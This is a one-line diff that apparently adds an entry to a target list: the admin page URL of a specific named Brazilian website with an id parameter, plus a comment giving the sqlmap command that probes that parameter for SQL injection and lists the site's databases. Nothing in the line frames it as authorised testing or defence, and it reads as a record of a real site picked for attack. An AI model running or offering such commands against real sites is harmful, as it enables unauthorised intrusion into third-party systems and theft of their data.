@@ -1,0 +1,1 @@
+https://novo.fcf.com.br/admin/index.php?id=1 (GET)  # sqlmap.py -u https://novo.fcf.com.br/admin/index.php?id=1 -dbs
